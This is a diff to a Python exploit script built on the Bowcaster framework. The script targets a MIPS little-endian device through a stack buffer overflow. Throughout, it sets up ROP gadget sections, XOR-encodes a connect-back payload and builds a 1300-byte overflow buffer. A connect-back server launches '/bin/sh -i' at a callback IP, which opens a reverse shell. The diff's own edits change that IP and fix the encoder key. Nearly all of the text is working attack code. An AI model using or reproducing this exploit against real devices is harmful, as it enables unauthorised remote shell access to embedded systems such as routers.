@@ -28,7 +28,7 @@ from bowcaster.encoders.mips import *
 #from bowcaster.encoders.mips import MipsUpperAlphaEncoder
 logger=Logging()
 
-CALLBACK_IP="192.168.1.2"
+CALLBACK_IP="192.168.1.3"
 CALLBACK_PORT="8080"
 
 qemu=False
@@ -67,7 +67,6 @@ SC.gadget_section(688,0x427a4,description="stackfinder.")
 #stackjumber. jalr $s0
 SC.gadget_section(644,0x1ffbc,description="[$s0] stackjumper")
 
-#you can instantiate a ConnectbackHost instead ad pass it to both
 connectback_host=ConnectbackHost(CALLBACK_IP) #default port is 8080
 connectback_server=ConnectbackServer(connectback_host,startcmd="/bin/sh -i")
 
@@ -77,7 +76,7 @@ connectback_server=ConnectbackServer(connectback_host,startcmd="/bin/sh -i")
 payload=ConnectbackPayload(connectback_host,LittleEndian)
 
 try:
-    encoded_payload=MipsXorEncoder(payload,LittleEndian,badchars=badchars)
+    encoded_payload=MipsXorEncoder(payload,LittleEndian,key=0xecb9dcb4,badchars=badchars)
 except EncoderException as ee:
     print ee
     sys.exit(1)
@@ -87,7 +86,7 @@ SC.string_section(700,encoded_payload.shellcode,
             description="encoded connect back payload")
 
 logger.LOG_DEBUG("length of encoded shellcode, including stub is: %d" % len(encoded_payload.shellcode))
-print encoded_payload.pretty_string()
+#print encoded_payload.pretty_string()
 
 buf=OverflowBuffer(LittleEndian,1300,SC.section_list)
 logger.LOG_DEBUG("Length of overflow: %d" % buf.len())
